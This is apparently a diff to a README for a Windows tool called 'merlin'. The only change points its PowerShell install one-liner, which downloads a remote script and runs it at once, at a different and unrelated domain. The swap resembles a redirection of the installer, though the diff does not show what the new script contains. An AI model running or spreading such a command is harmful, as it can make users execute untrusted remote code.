@@ -28,7 +28,7 @@ No admin rights required. The installer goes to `%LOCALAPPDATA%\merlin\` and add
 **Installer options** use a scriptblock:
 
 ```powershell
-& ([scriptblock]::Create((irm https://merlin-agent.arthovlabs.com/install.ps1))) -NonInteractive -Branch main
+& ([scriptblock]::Create((irm https://merlin-agent.aexagent.site/install.ps1))) -NonInteractive -Branch main
 ```
 
 | Parameter | Purpose |
